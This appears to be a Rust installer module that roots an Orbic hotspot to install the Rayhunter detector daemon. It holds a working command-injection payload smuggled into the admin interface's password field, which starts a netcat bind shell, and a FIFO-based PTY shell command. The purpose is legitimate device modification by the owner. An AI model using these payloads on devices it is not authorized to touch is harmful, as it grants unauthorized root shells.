use std::net::SocketAddr;
use std::str::FromStr;
use std::time::Duration;

use anyhow::{Context, Result, bail};
use reqwest::Client;
use serde::Deserialize;
use tokio::time::sleep;

use crate::orbic_auth::{LoginInfo, LoginRequest, LoginResponse, encode_password};
use crate::output::{eprintln, print, println};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

use crate::util::{interactive_shell, telnet_send_command, telnet_send_file};
use crate::{CONFIG_TOML, RAYHUNTER_DAEMON_INIT};

// Some kajeet devices have password protected telnetd on port 23, so we use port 24 just in case
const TELNET_PORT: u16 = 24;

/// Build the shell command to start a PTY shell on a given port.
/// This is sent through an existing shell connection (not via HTTP exploit).
fn pty_start_command(port: u16) -> String {
    // Start a PTY-enabled shell on the specified port.
    // Uses a subshell with redirected stdin/stdout/stderr to ensure the process
    // survives after the parent shell exits.
    // Note: BusyBox nc doesn't reliably re-listen after a connection closes,
    // so this shell only supports one connection. Users should use --no-pty for
    // programmatic access that requires reconnection.
    //
    // The key trick is `exec 3<>/tmp/f` which opens the FIFO in read-write mode
    // BEFORE the pipeline starts. This prevents a deadlock where:
    //   - cat blocks waiting for a writer to open the FIFO
    //   - script can't start because the pipeline is blocked
    //
    // Data flow:
    //   Network input -> nc stdout -> script stdin -> PTY master -> shell
    //   Shell output -> PTY slave -> script stdout -> FIFO (fd 3) -> cat -> nc stdin -> Network
    //
    // First, kill any stale PTY processes that might be holding onto the FIFO from
    // a previous failed attempt. We kill cat and script processes - these are unlikely
    // to be running for other purposes on this embedded device.
    // The echo at the end confirms the command was processed.
    format!(
        "killall cat script 2>/dev/null; rm -f /tmp/f; mkfifo /tmp/f; (exec 3<>/tmp/f; cat <&3 | busybox nc -l -p {port} | script -q -c /bin/sh /dev/null >&3) </dev/null >/dev/null 2>&1 &\necho PTY_STARTED"
    )
}

/// Build the command injection payload for legacy shell (no PTY).
fn legacy_shell_command(port: u16) -> String {
    format!(r#"{{"password": "\"; busybox nc -ll -p {port} -e /bin/sh & #"}}"#)
}

#[derive(Deserialize, Debug)]
struct ExploitResponse {
    retcode: u32,
}

async fn login_and_exploit(admin_ip: &str, username: &str, password: &str) -> Result<()> {
    let client: Client = Client::new();

    // Step 1: Get login info (priKey and session cookie)
    let login_info_response = client
        .get(format!("http://{}/goform/GetLoginInfo", admin_ip))
        .send()
        .await
        .context("Failed to get login info")?;

    let session_cookie = login_info_response
        .headers()
        .get("set-cookie")
        .and_then(|cookie| cookie.to_str().ok())
        .context("No session cookie received")?
        .split(';')
        .next()
        .context("Invalid cookie format")?
        .to_string();

    let login_info: LoginInfo = login_info_response
        .json()
        .await
        .context("Failed to parse login info")?;

    if login_info.retcode != 0 {
        bail!("GetLoginInfo failed with retcode: {}", login_info.retcode);
    }

    // Parse priKey (format: "secret x timestamp")
    let mut parts = login_info.pri_key.split('x');
    let secret = parts.next().context("Missing secret in priKey")?;
    let timestamp = parts.next().context("Missing timestamp in priKey")?;
    if parts.next().is_some() {
        bail!("Invalid priKey format: {}", login_info.pri_key);
    }

    // Step 2: Encode credentials
    let username_md5 = format!("{:x}", md5::compute(username));
    let timestamp_start = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();

    let encoded_password = encode_password(password, secret, timestamp, timestamp_start)
        .context("Failed to encode password")?;

    let login_request = LoginRequest {
        username: username_md5,
        password: encoded_password,
    };

    // Step 3: Perform login
    let login_response = client
        .post(format!("http://{}/goform/login", admin_ip))
        .header("Content-Type", "application/json")
        .header("Cookie", &session_cookie)
        .json(&login_request)
        .send()
        .await
        .context("Failed to send login request")?;

    // Extract authenticated session cookie from login response
    let authenticated_cookie = login_response
        .headers()
        .get("set-cookie")
        .and_then(|cookie| cookie.to_str().ok())
        .map(|cookie| cookie.split(';').next().unwrap_or(cookie).to_string())
        .unwrap_or(session_cookie);

    let login_result: LoginResponse = login_response
        .json()
        .await
        .context("Failed to parse login response")?;

    if login_result.retcode != 0 {
        bail!("Login failed with retcode: {}", login_result.retcode);
    }

    // Step 4: Exploit using authenticated session
    // Original Orbic lacks telnetd (kajeet has it) so we need to use netcat
    // Note: We always start with legacy shell here because the HTTP exploit
    // filters < and > characters, which prevents the PTY command from working.
    // PTY mode is enabled later via telnet_send_command if needed.
    let response: ExploitResponse = client
        .post(format!("http://{}/action/SetRemoteAccessCfg", admin_ip))
        .header("Content-Type", "application/json")
        .header("Cookie", authenticated_cookie)
        .body(legacy_shell_command(TELNET_PORT))
        .send()
        .await
        .context("failed to start telnet")?
        .json()
        .await
        .context("failed to start telnet")?;

    if response.retcode != 0 {
        bail!("unexpected response while starting telnet: {:?}", response);
    }

    Ok(())
}

pub async fn start_telnet(
    admin_ip: &str,
    admin_username: &str,
    admin_password: Option<&str>,
) -> Result<()> {
    let Some(admin_password) = admin_password else {
        anyhow::bail!("--admin-password is required");
    };

    print!("Logging in and starting telnet... ");
    login_and_exploit(admin_ip, admin_username, admin_password).await?;
    println!("done");

    Ok(())
}

// Port for PTY shell (different from legacy to avoid conflicts)
const PTY_PORT: u16 = 25;

/// Upgrade an existing legacy shell to PTY mode.
/// Starts PTY shell on a different port via the legacy shell connection.
async fn upgrade_to_pty(admin_ip: &str) -> Result<()> {
    let legacy_addr = SocketAddr::from_str(&format!("{admin_ip}:{TELNET_PORT}"))?;

    // Wait for the legacy shell to be available
    let timeout_duration = Duration::from_secs(10);
    let start_time = std::time::Instant::now();
    while telnet_send_command(legacy_addr, "true", "exit code 0", false)
        .await
        .is_err()
    {
        if start_time.elapsed() >= timeout_duration {
            bail!("Timeout waiting for shell to become available");
        }
        sleep(Duration::from_millis(500)).await;
    }

    // Start PTY shell on the PTY port via the legacy shell.
    // Send the command directly without the echo suffix that telnet_send_command adds,
    // since that can interfere with backgrounded commands.
    let start_cmd = pty_start_command(PTY_PORT);
    let mut stream = TcpStream::connect(legacy_addr).await?;
    stream.write_all(start_cmd.as_bytes()).await?;
    stream.write_all(b"\n").await?;

    // Wait for PTY_STARTED marker to confirm the command was processed
    let mut buf = vec![0u8; 1024];
    let mut total_read = 0;
    let timeout_duration = Duration::from_secs(10);
    let start_time = std::time::Instant::now();

    loop {
        if start_time.elapsed() >= timeout_duration {
            bail!("Timeout waiting for PTY shell to start");
        }

        match tokio::time::timeout(Duration::from_secs(1), stream.read(&mut buf[total_read..]))
            .await
        {
            Ok(Ok(0)) => break, // Connection closed
            Ok(Ok(n)) => {
                total_read += n;
                let output = String::from_utf8_lossy(&buf[..total_read]);
                if output.contains("PTY_STARTED") {
                    break;
                }
            }
            Ok(Err(e)) => {
                bail!("Error reading from shell: {}", e);
            }
            Err(_) => continue, // Timeout, try again
        }
    }
    drop(stream);

    // Wait for the PTY shell to start listening.
    // Note: We don't verify by connecting because BusyBox nc only accepts one connection,
    // and we want the interactive_shell to be that connection.
    sleep(Duration::from_secs(2)).await;

    Ok(())
}

pub async fn install(
    admin_ip: String,
    admin_username: String,
    admin_password: Option<String>,
) -> Result<()> {
    let Some(admin_password) = admin_password else {
        eprintln!(
            "As of version 0.8.0, the orbic installer has been rewritten and now requires an --admin-password parameter."
        );
        eprintln!(
            "Refer to the official documentation at https://efforg.github.io/rayhunter/ for how to find the right value."
        );
        eprintln!();
        eprintln!(
            "If you are following a tutorial that does not include this parameter, the tutorial is likely outdated. You can run ./installer orbic-usb to access the old installer, however we recommend against it."
        );
        anyhow::bail!("exiting");
    };

    print!("Logging in and starting telnet... ");
    login_and_exploit(&admin_ip, &admin_username, &admin_password).await?;
    println!("done");

    print!("Waiting for telnet to become available... ");
    wait_for_telnet(&admin_ip).await?;
    println!("done");

    setup_rayhunter(&admin_ip).await
}

async fn wait_for_telnet(admin_ip: &str) -> Result<()> {
    let addr = SocketAddr::from_str(&format!("{admin_ip}:{TELNET_PORT}"))?;
    let timeout = Duration::from_secs(60);
    let start_time = std::time::Instant::now();

    while telnet_send_command(addr, "true", "exit code 0", false)
        .await
        .is_err()
    {
        if start_time.elapsed() >= timeout {
            bail!(
                "Timeout waiting for telnet to become available after {:?}",
                timeout
            );
        }
        sleep(Duration::from_secs(1)).await;
    }

    Ok(())
}

async fn setup_rayhunter(admin_ip: &str) -> Result<()> {
    let addr = SocketAddr::from_str(&format!("{admin_ip}:{TELNET_PORT}"))?;
    let rayhunter_daemon_bin = include_bytes!(env!("FILE_RAYHUNTER_DAEMON"));

    // Remount filesystem as read-write to allow modifications
    // This is really only necessary for the Moxee Hotspot
    telnet_send_command(
        addr,
        "mount -o remount,rw /dev/ubi0_0 /",
        "exit code 0",
        false,
    )
    .await?;

    telnet_send_command(addr, "mkdir -p /data/rayhunter", "exit code 0", false).await?;

    telnet_send_file(
        addr,
        "/data/rayhunter/rayhunter-daemon",
        rayhunter_daemon_bin,
        false,
    )
    .await?;

    telnet_send_file(
        addr,
        "/data/rayhunter/config.toml",
        CONFIG_TOML
            .replace(r#"#device = "orbic""#, r#"device = "orbic""#)
            .as_bytes(),
        false,
    )
    .await?;

    telnet_send_file(
        addr,
        "/etc/init.d/rayhunter_daemon",
        RAYHUNTER_DAEMON_INIT.as_bytes(),
        false,
    )
    .await?;

    telnet_send_file(
        addr,
        "/etc/init.d/misc-daemon",
        include_bytes!("../../dist/scripts/misc-daemon"),
        false,
    )
    .await?;

    telnet_send_command(
        addr,
        "chmod +x /data/rayhunter/rayhunter-daemon",
        "exit code 0",
        false,
    )
    .await?;
    telnet_send_command(
        addr,
        "chmod 755 /etc/init.d/rayhunter_daemon",
        "exit code 0",
        false,
    )
    .await?;
    telnet_send_command(
        addr,
        "chmod 755 /etc/init.d/misc-daemon",
        "exit code 0",
        false,
    )
    .await?;

    println!("Installation complete. Rebooting device...");
    telnet_send_command(addr, "shutdown -r -t 1 now", "", false)
        .await
        .ok();

    println!(
        "Device is rebooting. After it's started up again, check out the web interface at http://{}:8080",
        admin_ip
    );

    Ok(())
}

/// Root the Orbic device and open an interactive shell
pub async fn shell(
    admin_ip: &str,
    admin_username: &str,
    admin_password: Option<&str>,
    use_pty: bool,
) -> Result<()> {
    // Start with legacy shell (PTY can't be started via HTTP exploit due to character filtering)
    start_telnet(admin_ip, admin_username, admin_password).await?;

    let shell_port = if use_pty {
        // Upgrade to PTY mode by sending upgrade command through the legacy shell
        print!("Upgrading to PTY mode... ");
        upgrade_to_pty(admin_ip).await?;
        println!("done");
        eprintln!("Connected to PTY shell. Press Ctrl+D or type 'exit' to disconnect.");
        PTY_PORT
    } else {
        eprintln!(
            "Connected (legacy mode). Shell prompt may not be visible, but commands work."
        );
        TELNET_PORT
    };
    // raw_mode on client should match use_pty for proper key forwarding
    interactive_shell(admin_ip, shell_port, use_pty).await
}
